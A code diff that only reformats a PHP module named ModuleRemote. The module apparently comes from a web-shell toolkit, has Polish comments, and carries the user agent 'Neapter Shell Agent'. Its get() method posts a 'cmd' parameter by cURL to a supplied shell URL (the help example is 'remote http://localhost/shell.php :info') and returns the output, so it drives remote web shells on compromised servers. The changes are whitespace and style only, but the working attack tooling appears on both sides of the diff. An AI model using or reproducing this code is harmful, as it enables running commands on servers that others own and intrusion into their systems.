@@ -20,40 +20,40 @@
  */
 class ModuleRemote extends ModuleAbstract
 {
-	/**
-	 * Dostepna lista komend
-	 *
-	 * @access public
-	 * @return array
-	 */
-	public function getCommands()
-	{
-		return array( 'remote' );
-	}
+    /**
+     * Dostepna lista komend
+     *
+     * @access public
+     * @return array
+     */
+    public function getCommands()
+    {
+        return array('remote');
+    }
 
-	/**
-	 * Zwracanie wersji modulu
-	 *
-	 * @access public
-	 * @return string
-	 */
-	public function getVersion()
-	{
-		/**
-		 * Wersja Data Autor
-		 */
-		return '1.00 2012-01-26 - <krzotr@gmail.com>';
-	}
+    /**
+     * Zwracanie wersji modulu
+     *
+     * @access public
+     * @return string
+     */
+    public function getVersion()
+    {
+        /**
+         * Wersja Data Autor
+         */
+        return '1.00 2012-01-26 - <krzotr@gmail.com>';
+    }
 
-	/**
-	 * Zwracanie pomocy modulu
-	 *
-	 * @access public
-	 * @return string
-	 */
-	public function getHelp()
-	{
-		return <<<DATA
+    /**
+     * Zwracanie pomocy modulu
+     *
+     * @access public
+     * @return string
+     */
+    public function getHelp()
+    {
+        return <<<DATA
 Zdalne wywołanie shella
 
 	Użycie
@@ -62,69 +62,66 @@ Zdalne wywołanie shella
 	Przykład
 		remote http://localhost/shell.php :info
 DATA;
-	}
+    }
 
-	/**
-	 * Wywolanie modulu
-	 *
-	 * @access public
-	 * @return string
-	 */
-	public function get()
-	{
-		/**
-		 * Help
-		 */
-		if( $this -> oShell -> getArgs() -> getNumberOfParams() < 2 )
-		{
-			return $this -> getHelp();
-		}
+    /**
+     * Wywolanie modulu
+     *
+     * @access public
+     * @return string
+     */
+    public function get()
+    {
+        /**
+         * Help
+         */
+        if ($this->oShell->getArgs()->getNumberOfParams() < 2) {
+            return $this->getHelp();
+        }
 
-		/**
-		 * Rozszerzenie CURL jest wymagane
-		 */
-		if( ! extension_loaded( 'curl' ) )
-		{
-			return 'Brak rozszerzenie CURL';
-		}
+        /**
+         * Rozszerzenie CURL jest wymagane
+         */
+        if (!extension_loaded('curl')) {
+            return 'Brak rozszerzenie CURL';
+        }
 
-		$rCurl = curl_init();
+        $rCurl = curl_init();
 
-		/**
-		 * Parametry
-		 */
-		curl_setopt_array( $rCurl, array
-			(
-				CURLOPT_URL            => $this -> oShell -> getArgs() -> getParam( 0 ),
-				CURLOPT_USERAGENT      => 'Neapter Shell Agent',
-				CURLOPT_ENCODING       => 'gzip, deflate',
-				CURLOPT_POST           => TRUE,
-				CURLOPT_POSTFIELDS     => array( 'cmd' => $this -> oShell -> getArgs() -> getParam( 1 ) ),
-				CURLOPT_CONNECTTIMEOUT => 60,
-				CURLOPT_RETURNTRANSFER => TRUE,
-				CURLOPT_HTTPHEADER     => array( 'X-Requested-With: XMLHttpRequest' )
-			)
-		);
+        /**
+         * Parametry
+         */
+        curl_setopt_array($rCurl, array
+            (
+                CURLOPT_URL => $this->oShell->getArgs()->getParam(0),
+                CURLOPT_USERAGENT => 'Neapter Shell Agent',
+                CURLOPT_ENCODING => 'gzip, deflate',
+                CURLOPT_POST => TRUE,
+                CURLOPT_POSTFIELDS => array('cmd' => $this->oShell->getArgs()->getParam(1)),
+                CURLOPT_CONNECTTIMEOUT => 60,
+                CURLOPT_RETURNTRANSFER => TRUE,
+                CURLOPT_HTTPHEADER => array('X-Requested-With: XMLHttpRequest')
+            )
+        );
 
-		/**
-		 * Polaczenie ze zdalnym shellem
-		 */
-		$sData = curl_exec( $rCurl );
+        /**
+         * Polaczenie ze zdalnym shellem
+         */
+        $sData = curl_exec($rCurl);
 
-		/**
-		 * Zamkniecie polaczenia
-		 */
-		curl_close( $rCurl );
+        /**
+         * Zamkniecie polaczenia
+         */
+        curl_close($rCurl);
 
-		/**
-		 * Blad podczas polaczenia z shellem
-		 */
-		if( $sData === FALSE )
-		{
-			return 'Nie można połączyć się ze zdalnym shellem';
-		}
+        /**
+         * Blad podczas polaczenia z shellem
+         */
+        if ($sData === FALSE) {
+            return 'Nie można połączyć się ze zdalnym shellem';
+        }
 
-		return htmlspecialchars( $sData );
-	}
+        return htmlspecialchars($sData);
+    }
 
 }
